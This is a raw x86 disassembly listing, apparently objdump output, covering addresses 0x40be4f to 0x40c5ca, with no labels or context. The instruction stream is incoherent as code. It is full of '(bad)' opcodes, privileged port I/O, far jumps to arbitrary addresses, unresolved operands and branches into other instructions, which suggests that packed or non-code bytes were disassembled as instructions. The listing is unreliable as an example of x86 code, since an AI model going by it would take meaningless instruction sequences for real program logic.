  40be4f:	cmp    ah,BYTE PTR [eax-0x48570b68]
  40be55:	mul    BYTE PTR [ebx+0x2]
  40be58:	sahf   
  40be59:	push   cs
  40be5a:	iret   
  40be5b:	call   0x72cbbebd
  40be60:	scas   al,BYTE PTR es:[edi]
  40be61:	inc    ecx
  40be62:	push   ebp
  40be63:	jp     0x40be8a
  40be65:	jns    0x40be30
  40be67:	and    BYTE PTR [ecx-0x28c721ac],ch
  40be6d:	adc    cl,cl
  40be6f:	jp     0x40bedf
  40be71:	(bad)
  40be74:	mov    ebx,ecx
  40be76:	(bad)  
  40be77:	and    eax,0x345ac147
  40be7c:	imul   ebx,DWORD PTR [ecx],0x27a77de
  40be82:	sbb    DWORD PTR [edi+0x60],edx
  40be85:	jp     0x40be97
  40be87:	xchg   ecx,eax
  40be88:	jge    0x40be5f
  40be8a:	xchg   edx,eax
  40be8b:	push   edi
  40be8c:	sub    eax,0xd8338bf7
  40be91:	out    dx,eax
  40be92:	imul   edi,DWORD PTR fs:[eax],0x4c
  40be96:	inc    esp
  40be97:	or     BYTE PTR [esi-0x34],ch
  40be9a:	push   ss
  40be9b:	push   cs
  40be9c:	inc    esi
  40be9d:	aaa    
  40be9e:	mov    esi,0x1a0f9005
  40bea3:	xchg   ebx,eax
  40bea4:	js     0x40bed1
  40bea6:	fisubr DWORD PTR [edi+eiz*4]
  40bea9:	push   es
  40beaa:	jmp    0x353f0cd6
  40beaf:	es dec ebp
  40beb1:	inc    eax
  40beb2:	es add eax,0x95a3468b
  40beb8:	push   ds
  40beb9:	ss mov ebp,0xbd3d2bb5
  40bebf:	scas   eax,DWORD PTR es:[edi]
  40bec0:	pushf  
  40bec1:	dec    edi
  40bec2:	fimul  WORD PTR [ebx-0x47]
  40bec5:	push   0x2af7a583
  40beca:	test   eax,0xcd1ea70d
  40becf:	cmp    DWORD PTR [esi-0x5d],ebp
  40bed2:	in     al,dx
  40bed3:	sbb    al,0x97
  40bed5:	jne    0x40befc
  40bed7:	push   edi
  40bed8:	mov    edi,DWORD PTR [ebx+ecx*8+0x5c]
  40bedc:	mov    WORD PTR [ebx-0x37],fs
  40bedf:	mov    bh,0x75
  40bee1:	mov    edx,DWORD PTR [eax-0x46c28e5d]
  40bee7:	das    
  40bee8:	in     al,0x5f
  40beea:	and    eax,0x4258e6b9
  40beef:	xor    BYTE PTR [eax+esi*1-0x5b578fff],bh
  40bef6:	xor    ebx,DWORD PTR [edi+edi*8]
  40bef9:	or     al,0xe8
  40befb:	jb     0x40bf1e
  40befd:	fwait
  40befe:	mov    edi,0x69c3792a
  40bf03:	rcl    DWORD PTR [eax-0x48cf6a01],1
  40bf09:	clc    
  40bf0a:	dec    edx
  40bf0b:	(bad)  
  40bf0c:	mov    BYTE PTR [ecx-0x3d],bh
  40bf0f:	mov    dl,BYTE PTR cs:[edi+0x7482c669]
  40bf16:	push   0x686aebe3
  40bf1b:	sub    bl,BYTE PTR [ebx]
  40bf1d:	cmp    al,0x3f
  40bf1f:	sub    DWORD PTR [ecx-0x8],ebx
  40bf22:	repnz sbb ch,BYTE PTR [edx]
  40bf25:	dec    esi
  40bf26:	add    bh,BYTE PTR [eax]
  40bf28:	jb     0x40bf1e
  40bf2a:	mov    al,0x21
  40bf2c:	clc    
  40bf2d:	pop    edi
  40bf2e:	sbb    DWORD PTR [edx-0x2eea8c88],ecx
  40bf34:	out    dx,al
  40bf35:	jbe    0x40bf60
  40bf37:	es pop edi
  40bf39:	lods   eax,DWORD PTR ds:[esi]
  40bf3a:	idiv   DWORD PTR [esi-0x6ad3e310]
  40bf40:	sub    DWORD PTR [edi],ecx
  40bf42:	sub    esi,esi
  40bf44:	loope  0x40bf3f
  40bf46:	or     edi,DWORD PTR [eax+0x1fd65174]
  40bf4c:	test   eax,0xa14b0f92
  40bf51:	jp     0x40bf26
  40bf53:	cmp    eax,0x1cf49829
  40bf58:	dec    edi
  40bf59:	xchg   esp,eax
  40bf5a:	popa   
  40bf5b:	dec    edi
  40bf5c:	and    al,0x8
  40bf5e:	cmp    ch,dh
  40bf60:	pop    edx
  40bf61:	push   eax
  40bf62:	pop    es
  40bf63:	jmp    0x25c63014
  40bf68:	sbb    ah,dl
  40bf6a:	inc    esi
  40bf6b:	push   ebx
  40bf6c:	mov    bh,0x31
  40bf6e:	or     BYTE PTR gs:[edi],bl
  40bf71:	inc    esp
  40bf72:	sbb    DWORD PTR [ebp-0x56],ebp
  40bf75:	inc    ebx
  40bf76:	(bad)  
  40bf77:	in     al,dx
  40bf78:	xchg   ecx,eax
  40bf79:	pop    es
  40bf7a:	pop    ebp
  40bf7b:	and    eax,0x2704acef
  40bf80:	je     0x40bfa9
  40bf82:	sub    ebx,DWORD PTR [ecx]
  40bf84:	sbb    BYTE PTR [edi+esi*8+0x150f5679],bh
  40bf8b:	lock mov eax,0x8af16951
  40bf91:	scas   eax,DWORD PTR es:[edi]
  40bf92:	adc    BYTE PTR ds:0xa33a382e,bh
  40bf98:	jne    0x40bf4b
  40bf9a:	mov    dl,0xa6
  40bf9c:	pop    ds
  40bf9d:	pop    esi
  40bf9e:	pop    es
  40bf9f:	xchg   esp,eax
  40bfa0:	add    al,0x88
  40bfa2:	adc    eax,0x860e1cef
  40bfa7:	stos   BYTE PTR es:[edi],al
  40bfa8:	addr16 jg 0x40bfd3
  40bfab:	and    BYTE PTR [ebx+edx*2],ch
  40bfae:	cmp    ecx,edi
  40bfb0:	lahf   
  40bfb1:	and    eax,0xe25e688d
  40bfb6:	in     eax,dx
  40bfb7:	fnsave [esi-0x3a83f261]
  40bfbd:	jmp    0x40bf8e
  40bfbf:	(bad)  
  40bfc0:	xor    BYTE PTR [ecx+0x12ab1798],ch
  40bfc6:	jecxz  0x40bf95
  40bfc8:	fwait
  40bfc9:	or     ch,dl
  40bfcb:	jno    0x40bfbf
  40bfcd:	cmp    al,0x3f
  40bfcf:	jb     0x40bffc
  40bfd1:	add    bl,BYTE PTR [ebp-0x7a]
  40bfd4:	dec    ebp
  40bfd5:	pop    eax
  40bfd6:	jle    0x40bf64
  40bfd8:	jg     0x40bfe7
  40bfda:	push   0xffffffaf
  40bfdc:	jecxz  0x40c051
  40bfde:	mov    fs,WORD PTR [edx-0x7e]
  40bfe1:	mov    al,0x41
  40bfe3:	lock mov esp,?
  40bfe6:	push   DWORD PTR [ecx-0x2dc33af1]
  40bfec:	cli    
  40bfed:	out    0xbc,eax
  40bfef:	and    bh,bl
  40bff1:	mul    ecx
  40bff3:	mov    dl,0xc9
  40bff5:	int    0xfa
  40bff7:	call   0x62a9:0x6d395f09
  40bffe:	cmp    eax,0x197baae6
  40c003:	and    ah,BYTE PTR [edx+edx*1+0x14]
  40c007:	inc    edi
  40c008:	mov    bh,0xc9
  40c00a:	test   eax,0xe93fccce
  40c00f:	ins    BYTE PTR es:[edi],dx
  40c010:	adc    ebx,DWORD PTR [edi+0x65]
  40c013:	push   0x57429eab
  40c018:	sbb    eax,0x620c02a4
  40c01d:	add    dl,ch
  40c01f:	out    dx,al
  40c020:	ror    bh,cl
  40c022:	pop    esi
  40c024:	mov    cl,BYTE PTR [ecx]
  40c026:	mov    edx,DWORD PTR [eax+ebx*1]
  40c029:	fcmovbe st,st(4)
  40c02b:	inc    ebp
  40c02c:	cld    
  40c02d:	mov    cl,0x57
  40c02f:	hlt    
  40c030:	cmp    edi,DWORD PTR [ebp+ebx*1+0x6d6d56b5]
  40c037:	mov    DWORD PTR [bx+di-0xdd1],edi
  40c03c:	cs push 0x76
  40c03f:	add    al,0xff
  40c041:	icebp  
  40c042:	push   ss
  40c043:	lea    eax,[edx]
  40c045:	or     eax,0x66f2d900
  40c04a:	sbb    eax,0x391485a7
  40c04f:	jg     0x40c0bb
  40c051:	out    dx,eax
  40c052:	ret    
  40c053:	ss jl  0x40c04f
  40c056:	shr    DWORD PTR [ebx+0x45],cl
  40c059:	cwde   
  40c05a:	dec    esi
  40c05b:	and    BYTE PTR [esp+edx*8-0x1fc579af],0x94
  40c063:	cmp    BYTE PTR [esi-0x19],ah
  40c066:	sbb    DWORD PTR [ebx-0x17],esi
  40c069:	sbb    dh,BYTE PTR [eax+0x16]
  40c06c:	out    0x82,al
  40c06e:	mov    dh,0x36
  40c070:	je     0x40c0a8
  40c072:	jno    0x40c0c0
  40c074:	loopne 0x40c0a8
  40c076:	add    eax,edi
  40c078:	into   
  40c079:	adc    ch,bh
  40c07b:	hlt    
  40c07c:	cdq    
  40c07d:	fsub   st(1),st
  40c07f:	test   al,0x5c
  40c081:	or     eax,0xeeaf913f
  40c086:	(bad)  
  40c087:	ret    
  40c088:	mov    bh,0x6e
  40c08a:	xchg   ebp,eax
  40c08b:	inc    ebx
  40c08c:	ss loop 0x40c0e7
  40c08f:	adc    eax,0x8f24cca0
  40c094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c095:	and    DWORD PTR [ebp-0x53],ecx
  40c098:	sub    BYTE PTR [esi+edi*4],cl
  40c09b:	sbb    al,0xfe
  40c09d:	dec    eax
  40c09e:	mov    ah,0x11
  40c0a0:	cdq    
  40c0a1:	popf   
  40c0a2:	(bad)  [ebx]
  40c0a4:	adc    eax,0x2d6ceca6
  40c0a9:	xor    al,0xe
  40c0ab:	scas   al,BYTE PTR es:[edi]
  40c0ac:	jnp    0x40c0cf
  40c0ae:	mov    ebp,0xe8270af8
  40c0b3:	dec    ebp
  40c0b4:	adc    ch,BYTE PTR [ebx+edi*1+0x4b]
  40c0b8:	xor    esi,DWORD PTR [edi-0x2143e0f2]
  40c0be:	and    BYTE PTR [eax-0xe1c2d8a],dl
  40c0c4:	retf   0x4050
  40c0c7:	xor    BYTE PTR [ebp+0x4d],ch
  40c0ca:	add    BYTE PTR [esi+esi*4-0x10f8e8d9],0xa1
  40c0d2:	mov    ah,BYTE PTR [esi*2-0x4140747]
  40c0d9:	mov    ds:0x7dc35fbb,eax
  40c0de:	mov    ch,0x3
  40c0e0:	sub    eax,0x791ab81
  40c0e5:	sbb    DWORD PTR [eax],0xffffffae
  40c0e8:	and    ecx,ebp
  40c0ea:	rol    BYTE PTR [eax+0xed37253],cl
  40c0f0:	stos   DWORD PTR es:[edi],eax
  40c0f1:	push   0x5bb51aaf
  40c0f6:	mov    DWORD PTR [edi],eax
  40c0f8:	je     0x40c0e0
  40c0fa:	adc    al,0xf3
  40c0fc:	cmp    al,0xd9
  40c0fe:	(bad)  
  40c0ff:	in     al,0xe
  40c101:	inc    ecx
  40c102:	fwait
  40c103:	pusha  
  40c104:	imul   edx,DWORD PTR [edx+0x156e43e9],0xc4b63e03
  40c10e:	inc    esp
  40c10f:	jbe    0x40c0e6
  40c111:	xchg   ebx,eax
  40c112:	add    DWORD PTR ds:0x7c863e12,eax
  40c118:	inc    ebp
  40c119:	add    al,0xb2
  40c11b:	jle    0x40c0de
  40c11d:	xchg   edx,eax
  40c11e:	xchg   ebp,eax
  40c11f:	inc    edx
  40c120:	lea    esp,[edx]
  40c122:	add    DWORD PTR [esi+0x76],ebx
  40c125:	arpl   WORD PTR [ecx+0xc],di
  40c128:	(bad)  
  40c129:	test   al,0x4b
  40c12b:	xchg   edx,eax
  40c12c:	lds    ecx,FWORD PTR [eax-0x67]
  40c12f:	cmp    dh,BYTE PTR [ecx-0x5bf77d4b]
  40c135:	sbb    al,BYTE PTR [ebx+eax*8+0x7e]
  40c139:	lods   eax,DWORD PTR ds:[esi]
  40c13a:	rcr    DWORD PTR [ecx+0x1e],0x8d
  40c13e:	vpsrld xmm4,xmm2,xmm7
  40c142:	xchg   esi,eax
  40c143:	retf   0x3346
  40c146:	and    bl,BYTE PTR ds:0xc2c1a0ee
  40c14c:	jmp    0x40c1c6
  40c14e:	push   ebx
  40c14f:	and    esi,DWORD PTR [eax]
  40c151:	pop    edi
  40c152:	add    edi,DWORD PTR [ebx-0x28]
  40c155:	call   ecx
  40c157:	inc    esi
  40c158:	add    al,0xb8
  40c15a:	cmp    eax,0x7475605
  40c15f:	jns    0x40c0f7
  40c161:	xchg   esi,eax
  40c162:	fimul  DWORD PTR [eax]
  40c164:	popa   
  40c165:	call   0x7ef2:0xc6b6423
  40c16c:	mov    eax,ds:0x2e2a39b2
  40c171:	rcr    BYTE PTR [esi+eiz*8-0x4320df4b],0x10
  40c179:	xchg   ebx,eax
  40c17a:	out    0xf2,eax
  40c17c:	push   es
  40c17d:	out    dx,al
  40c17e:	inc    ecx
  40c17f:	sub    DWORD PTR gs:[esi-0xa839390],edi
  40c186:	push   0xffffffbf
  40c188:	jecxz  0x40c192
  40c18a:	into   
  40c18b:	mov    eax,ds:0x72b88b3d
  40c190:	and    DWORD PTR [ebp+ebp*8+0x21bc5f9a],ebx
  40c197:	loopne 0x40c20d
  40c199:	sub    ebx,edx
  40c19b:	(bad)  
  40c19c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c19d:	shl    BYTE PTR [eax-0x7be803be],cl
  40c1a3:	push   ss
  40c1a4:	out    0xfb,eax
  40c1a6:	sbb    esi,ecx
  40c1a8:	shr    BYTE PTR [ebp+0x1169704f],1
  40c1ae:	fs js  0x40c161
  40c1b1:	pop    esp
  40c1b2:	mov    WORD PTR [esi-0x5db60f68],cs
  40c1b8:	xlat   BYTE PTR cs:[ebx]
  40c1ba:	mov    al,0xb8
  40c1bc:	mov    edi,?
  40c1be:	leave  
  40c1bf:	xchg   edx,eax
  40c1c0:	pop    esi
  40c1c1:	gs idiv al
  40c1c4:	cs ret 0xcf82
  40c1c8:	jo     0x40c1fd
  40c1ca:	in     al,dx
  40c1cb:	sub    esi,edx
  40c1cd:	imul   DWORD PTR [edx-0x4c849ed]
  40c1d3:	add    eax,0x56dda731
  40c1d8:	xor    bh,BYTE PTR [eax]
  40c1da:	mov    eax,ds:0x21c2e8ee
  40c1df:	jne    0x40c20c
  40c1e1:	and    BYTE PTR ds:0x65033043,dl
  40c1e7:	test   BYTE PTR [ebp+0x5a91fbcb],bh
  40c1ed:	cs pop ss
  40c1ef:	mov    dh,dl
  40c1f1:	das    
  40c1f2:	mov    ch,0x67
  40c1f4:	xchg   edi,eax
  40c1f5:	int3   
  40c1f6:	jno    0x40c1bd
  40c1f8:	fnsave [ecx+ecx*1-0x22096d03]
  40c1ff:	cs jne 0x40c20b
  40c202:	mov    ebx,0xf1d0b3f9
  40c207:	mov    bl,0xd6
  40c209:	pop    edx
  40c20a:	fsubr  QWORD PTR [edi-0x10]
  40c20d:	mov    eax,ds:0x82a75f70
  40c213:	dec    ecx
  40c214:	adc    BYTE PTR [eax+0x78f21d82],bl
  40c21a:	out    0xd3,al
  40c21c:	jb     0x40c1a1
  40c21e:	ss stos DWORD PTR es:[edi],eax
  40c220:	pop    ecx
  40c221:	int3   
  40c222:	add    dl,BYTE PTR [eax-0x36]
  40c225:	and    al,0x83
  40c227:	and    esi,DWORD PTR [edi]
  40c229:	outs   dx,DWORD PTR ds:[esi]
  40c22a:	aas    
  40c22b:	(bad)
  40c22e:	in     eax,dx
  40c22f:	shr    DWORD PTR [edx+0x111b4a17],1
  40c235:	xor    dh,BYTE PTR [ebx-0x75272e87]
  40c23b:	pusha  
  40c23c:	popf   
  40c23d:	(bad)  
  40c23e:	push   eax
  40c23f:	push   0x97a3d861
  40c244:	inc    eax
  40c245:	jne    0x40c244
  40c247:	addr16 out dx,al
  40c249:	dec    esp
  40c24a:	and    BYTE PTR [edx-0x21b3442a],ch
  40c250:	sub    DWORD PTR [ecx+ecx*1-0x19],edi
  40c254:	ucomiss xmm3,DWORD PTR ds:0x1d0387f8
  40c25b:	inc    BYTE PTR [esi-0x41af3608]
  40c261:	sbb    BYTE PTR [eax+0x34238079],cl
  40c267:	and    BYTE PTR [ebx],cl
  40c269:	out    0x8a,al
  40c26b:	repz aad 0x95
  40c26e:	or     DWORD PTR [eax],0xda410c54
  40c274:	adc    DWORD PTR [eax],esi
  40c276:	push   0x69
  40c278:	push   ecx
  40c279:	dec    esp
  40c27a:	and    al,0x5d
  40c27c:	ret    
  40c27d:	mov    eax,ds:0x65d800e8
  40c282:	jno    0x40c2c8
  40c284:	imul   eax,DWORD PTR ds:0xa05acc1d,0x98a1021
  40c28e:	(bad)
  40c292:	and    esp,DWORD PTR [edx+0x663a2fd8]
  40c298:	dec    esi
  40c299:	and    DWORD PTR [ebx],edi
  40c29b:	outs   dx,DWORD PTR ds:[esi]
  40c29c:	cmp    ah,BYTE PTR [ebx+0x5]
  40c29f:	and    al,0x7d
  40c2a1:	mov    esi,0xfdb82996
  40c2a6:	cwde   
  40c2a7:	(bad)  
  40c2a8:	pop    ebp
  40c2a9:	(bad)  
  40c2aa:	jge    0x40c234
  40c2ac:	idiv   DWORD PTR [eax]
  40c2ae:	and    DWORD PTR [esi],edx
  40c2b0:	cmp    al,0xb8
  40c2b2:	in     al,dx
  40c2b3:	data16 mov cl,0xce
  40c2b6:	arpl   WORD PTR [esi],si
  40c2b8:	and    DWORD PTR [ebx],ecx
  40c2ba:	stos   BYTE PTR es:[edi],al
  40c2bb:	addr16 jnp 0x40c324
  40c2be:	ins    DWORD PTR es:[edi],dx
  40c2bf:	out    dx,al
  40c2c0:	arpl   WORD PTR [edi],si
  40c2c2:	jb     0x40c25f
  40c2c4:	sahf   
  40c2c5:	iret   
  40c2c6:	pop    ds
  40c2c7:	ret    0xd632
  40c2ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2cb:	lea    edi,[eax]
  40c2cd:	aas    
  40c2ce:	push   ecx
  40c2cf:	inc    eax
  40c2d0:	mov    BYTE PTR [ebx],ch
  40c2d2:	xchg   ecx,eax
  40c2d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2d4:	repnz cdq 
  40c2d6:	retf   0x48a9
  40c2d9:	ins    BYTE PTR es:[edi],dx
  40c2da:	and    al,0x7
  40c2dc:	or     BYTE PTR [edi+ebp*8-0x67521233],0xea
  40c2e4:	dec    edx
  40c2e5:	jnp    0x40c2be
  40c2e7:	pop    ebp
  40c2e8:	mov    ds:0xc7e682a2,al
  40c2ed:	add    al,0x91
  40c2ef:	clc    
  40c2f0:	retf   
  40c2f1:	add    eax,0x11bf0e78
  40c2f6:	ds js  0x40c321
  40c2f9:	les    ebx,FWORD PTR [eax]
  40c2fb:	sbb    ch,BYTE PTR [esi+0x1d]
  40c2fe:	cmp    ebp,edx
  40c300:	adc    ebx,DWORD PTR [edi]
  40c302:	jno    0x40c301
  40c304:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40c306:	dec    esi
  40c307:	es stos DWORD PTR es:[edi],eax
  40c309:	sbb    ecx,0x10
  40c30c:	push   es
  40c30d:	inc    eax
  40c30e:	daa    
  40c30f:	(bad)  
  40c310:	push   0xffffffdd
  40c312:	push   0x5b99c99f
  40c317:	jne    0x40c343
  40c319:	loop   0x40c31d
  40c31b:	jno    0x40c36d
  40c31d:	(bad)  
  40c31e:	pop    esp
  40c31f:	and    BYTE PTR [edx],bh
  40c321:	neg    DWORD PTR ds:0x8302a001
  40c327:	pop    eax
  40c328:	shl    BYTE PTR [ebp-0x6a],1
  40c32b:	or     DWORD PTR [eax-0x32],0x2
  40c32f:	add    ch,BYTE PTR [ecx-0x59056146]
  40c335:	pop    esi
  40c336:	mov    bh,0x2f
  40c338:	hlt    
  40c339:	dec    ecx
  40c33a:	aas    
  40c33b:	es int3 
  40c33d:	bound  edx,QWORD PTR [ebx+0x23fb8fc9]
  40c343:	push   cs
  40c344:	std    
  40c345:	xor    BYTE PTR [eax+0x9],ch
  40c348:	jno    0x40c2dc
  40c34a:	mov    al,ds:0x51a789ce
  40c34f:	cld    
  40c350:	push   cs
  40c351:	xchg   ebx,eax
  40c352:	push   eax
  40c353:	pop    edi
  40c354:	xor    esi,0xa65e2734
  40c35a:	nop
  40c35b:	or     esp,DWORD PTR [eax]
  40c35d:	mov    dh,0xfa
  40c35f:	scas   eax,DWORD PTR es:[edi]
  40c360:	stc    
  40c361:	mov    dl,0x14
  40c363:	push   ebx
  40c364:	popf   
  40c365:	and    eax,0x65db824a
  40c36a:	push   eax
  40c36b:	mov    BYTE PTR [ebx+edi*1-0x1195d20],al
  40c372:	in     al,0x2f
  40c374:	sahf   
  40c375:	jns    0x40c3e6
  40c377:	pop    edi
  40c378:	ins    BYTE PTR es:[edi],dx
  40c379:	mov    dl,0xd6
  40c37b:	and    al,0xb5
  40c37d:	pop    esi
  40c37e:	es mov esp,0x667504a0
  40c384:	imul   esp,DWORD PTR [esp+esi*2],0x7390b43d
  40c38b:	fisubr WORD PTR [ecx]
  40c38d:	add    ecx,DWORD PTR [ebp-0x27]
  40c390:	mov    ds:0x7ceddd26,al
  40c395:	push   ebp
  40c396:	fisttp QWORD PTR ds:0x5469178d
  40c39c:	loope  0x40c41a
  40c39e:	jp     0x40c418
  40c3a0:	push   eax
  40c3a1:	sbb    ecx,DWORD PTR [eax-0x43]
  40c3a4:	mov    cl,0x26
  40c3a6:	(bad)  
  40c3a7:	out    dx,al
  40c3a8:	fdiv   QWORD PTR [eax+0x23]
  40c3ab:	clc    
  40c3ac:	mov    gs,WORD PTR [ebp-0x3baad45c]
  40c3b2:	stc    
  40c3b3:	xor    eax,0xd67591e1
  40c3b8:	jecxz  0x40c41c
  40c3ba:	dec    esp
  40c3bb:	sbb    ah,BYTE PTR [esi-0x77]
  40c3be:	or     eax,0xef02f33e
  40c3c3:	repnz mov al,0x21
  40c3c6:	add    al,0x91
  40c3c8:	fwait
  40c3c9:	out    dx,eax
  40c3ca:	push   ss
  40c3cb:	repz xor BYTE PTR [ebx],al
  40c3ce:	or     al,0x81
  40c3d0:	dec    eax
  40c3d1:	xchg   ecx,eax
  40c3d2:	push   cs
  40c3d3:	adc    cl,bh
  40c3d5:	cdq    
  40c3d6:	xchg   edx,eax
  40c3d7:	adc    esp,ecx
  40c3d9:	icebp  
  40c3da:	fsubr  DWORD PTR [edi+0x2d156d00]
  40c3e0:	and    ch,BYTE PTR [edx]
  40c3e2:	(bad)  
  40c3e3:	sbb    eax,0x67f3217f
  40c3e8:	push   eax
  40c3e9:	in     eax,0x41
  40c3eb:	inc    esi
  40c3ec:	cmp    al,BYTE PTR [eax-0x17c08441]
  40c3f2:	mov    esp,0x88a869b6
  40c3f7:	sahf   
  40c3f8:	dec    esi
  40c3f9:	aad    0x61
  40c3fb:	sbb    al,0xc7
  40c3fd:	stos   DWORD PTR es:[edi],eax
  40c3fe:	xor    cl,BYTE PTR ds:0x2fccbe32
  40c404:	mov    eax,0x69ffd5ed
  40c409:	mov    esp,0x19717d3e
  40c40e:	inc    edx
  40c40f:	adc    bh,BYTE PTR [ebx-0x68bed68]
  40c415:	not    DWORD PTR [edx+0x710039a]
  40c41b:	js     0x40c439
  40c41d:	jg     0x40c3c0
  40c41f:	(bad)  
  40c420:	xchg   esp,eax
  40c421:	add    DWORD PTR [edx+0x19b9ac00],eax
  40c427:	loope  0x40c3db
  40c429:	or     al,0x7a
  40c42b:	xor    BYTE PTR [ebx+ebx*8-0x75],cl
  40c42f:	ins    BYTE PTR es:[edi],dx
  40c430:	mov    ebp,0x98cd3f28
  40c435:	mov    ch,0xb4
  40c437:	push   edx
  40c438:	fld    DWORD PTR [ecx]
  40c43a:	retf   0x2991
  40c43d:	scas   eax,DWORD PTR es:[edi]
  40c43e:	cmp    al,0xb2
  40c440:	jne    0x40c4bb
  40c442:	(bad)  
  40c443:	sahf   
  40c444:	in     eax,dx
  40c445:	pushf  
  40c446:	xor    ebx,esi
  40c448:	mov    BYTE PTR [eax-0x7dc616f9],cl
  40c44e:	cmp    ch,BYTE PTR [ebx+0x5a508597]
  40c454:	inc    esi
  40c455:	jle    0x40c422
  40c457:	or     DWORD PTR [edi],esp
  40c459:	xchg   edi,eax
  40c45a:	dec    eax
  40c45b:	idiv   BYTE PTR [eax+0x2e386e18]
  40c461:	xchg   edx,eax
  40c462:	add    DWORD PTR [ebx],edi
  40c464:	pop    ebx
  40c465:	mov    dl,0x5d
  40c467:	mov    edx,gs
  40c469:	out    dx,eax
  40c46a:	mov    cl,0xf5
  40c46c:	rol    DWORD PTR [edi+0x18],0x69
  40c470:	aaa    
  40c471:	dec    edi
  40c472:	push   esp
  40c473:	bound  ecx,QWORD PTR [ecx+0xd]
  40c476:	ja     0x40c4aa
  40c478:	inc    edi
  40c479:	clc    
  40c47a:	sar    BYTE PTR [eax],1
  40c47c:	add    DWORD PTR [esi],ebx
  40c47e:	jno    0x40c43b
  40c480:	out    0xf8,al
  40c482:	jmp    0x23a3:0x89f65e89
  40c489:	pop    ds
  40c48a:	sbb    dh,dl
  40c48c:	mov    al,ds:0xb96a880f
  40c491:	imul   ebx,DWORD PTR [eax+ebx*1],0xb5b8a2d5
  40c498:	in     al,0x91
  40c49a:	ins    BYTE PTR es:[edi],dx
  40c49b:	fisub  WORD PTR [ebp+0x789d7f65]
  40c4a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4a2:	mov    ecx,0x4f6bfea2
  40c4a7:	cdq    
  40c4a8:	repz and esi,esi
  40c4ab:	cmp    ch,BYTE PTR [edi]
  40c4ad:	popa   
  40c4ae:	lds    ebx,FWORD PTR [eax-0x63]
  40c4b1:	mov    cl,BYTE PTR [eax-0x51c99385]
  40c4b7:	cmp    eax,0x8691dae2
  40c4bc:	add    eax,0xbdfa5880
  40c4c1:	call   0xe6a1b47f
  40c4c6:	scas   al,BYTE PTR es:[edi]
  40c4c7:	out    0x36,eax
  40c4c9:	fld    DWORD PTR [esi]
  40c4cb:	sar    edx,cl
  40c4cd:	les    esp,FWORD PTR [eax+eiz*4+0x57]
  40c4d1:	or     DWORD PTR [ecx-0x17774058],ecx
  40c4d7:	cwde   
  40c4d8:	ret    0x17c0
  40c4db:	rcl    DWORD PTR [ecx-0x5b],1
  40c4de:	shl    DWORD PTR [eax+edx*1],1
  40c4e1:	pop    ebp
  40c4e2:	stos   DWORD PTR es:[edi],eax
  40c4e3:	sbb    eax,DWORD PTR [edx+0x98a8a4]
  40c4e9:	cld    
  40c4ea:	sub    DWORD PTR [edx+ebx*8-0x5b],esi
  40c4ee:	mov    dl,bl
  40c4f0:	jle    0x40c4b1
  40c4f2:	dec    BYTE PTR [ecx]
  40c4f4:	and    eax,0x8b9b672f
  40c4f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4fa:	xchg   ebp,eax
  40c4fb:	mov    esp,0x7fc7c3e8
  40c500:	(bad)  
  40c501:	in     al,0x2d
  40c503:	outs   dx,DWORD PTR ds:[esi]
  40c504:	cmp    BYTE PTR [esi-0x79],0xc8
  40c508:	adc    ah,BYTE PTR [ebp+0x1d]
  40c50b:	push   DWORD PTR [ebp+0x389531a3]
  40c511:	out    dx,al
  40c512:	mov    ebp,0xb756ed20
  40c517:	sbb    BYTE PTR [eax-0x19],cl
  40c51a:	lahf   
  40c51b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c51c:	outs   dx,DWORD PTR ds:[esi]
  40c51d:	popw   ss
  40c51f:	adc    eax,DWORD PTR [ebx+0x19]
  40c522:	sbb    DWORD PTR [ebp-0xd],0x3c
  40c526:	sbb    esi,ebp
  40c528:	push   ss
  40c529:	sar    DWORD PTR [edi-0x642022fa],cl
  40c52f:	add    DWORD PTR [esi+eiz*4-0x80],ebp
  40c533:	xchg   ecx,eax
  40c534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c535:	or     eax,0x5ed64251
  40c53a:	adc    DWORD PTR [eax-0x966a6c2],ebp
  40c540:	ror    DWORD PTR ds:0x848bb2d0,cl
  40c546:	dec    ecx
  40c547:	push   ebp
  40c548:	jno    0x40c509
  40c54a:	xchg   ebp,eax
  40c54b:	mov    ds:0xb6518fb2,eax
  40c550:	out    0xa6,eax
  40c552:	ja     0x40c566
  40c554:	out    dx,al
  40c555:	dec    eax
  40c556:	fmul   DWORD PTR [esi]
  40c558:	out    dx,eax
  40c559:	pop    es
  40c55a:	mov    ecx,0x174d9bf5
  40c55f:	mov    dh,0xd3
  40c561:	mov    eax,ds:0x85118394
  40c566:	sub    esp,esp
  40c568:	add    eax,0xb394c286
  40c56d:	sar    BYTE PTR [esi-0x12],0xe4
  40c571:	leave  
  40c572:	inc    edx
  40c573:	sbb    edi,0x1137f160
  40c579:	mov    DWORD PTR [edi-0xf],eax
  40c57c:	out    dx,al
  40c57d:	je     0x40c5d7
  40c57f:	sub    BYTE PTR [ecx],ch
  40c581:	adc    BYTE PTR [eax],ch
  40c583:	test   BYTE PTR [ecx],ch
  40c585:	jae    0x40c5c0
  40c587:	and    BYTE PTR [eax+0xd2f6e83],cl
  40c58d:	scas   al,BYTE PTR es:[edi]
  40c58e:	aaa    
  40c58f:	sub    eax,DWORD PTR [eax]
  40c591:	bound  ebx,QWORD PTR ds:0x642e4e90
  40c597:	mov    bh,0xdf
  40c599:	push   edi
  40c59a:	into   
  40c59b:	out    dx,al
  40c59c:	imul   edx,DWORD PTR [ecx-0x4351e5f2],0x10
  40c5a3:	adc    eax,0x62f90f27
  40c5a8:	and    bl,al
  40c5aa:	inc    esi
  40c5ab:	xchg   BYTE PTR [ebx+0x3b],ah
  40c5ae:	adc    ah,bh
  40c5b0:	iret   
  40c5b1:	(bad)  
  40c5b2:	mov    ds:0x72a270d8,eax
  40c5b7:	mov    esp,0xf2f68cf3
  40c5bc:	add    bh,ch
  40c5be:	sbb    al,0xda
  40c5c0:	fbld   TBYTE PTR [ebx-0x7d]
  40c5c3:	ins    BYTE PTR es:[edi],dx
  40c5c4:	jg     0x40c626
  40c5c6:	retf   0x5554
  40c5c9:	push   esi
  40c5ca:	sub    BYTE PTR [eax+edx*1+0x1aa28090],0x6e
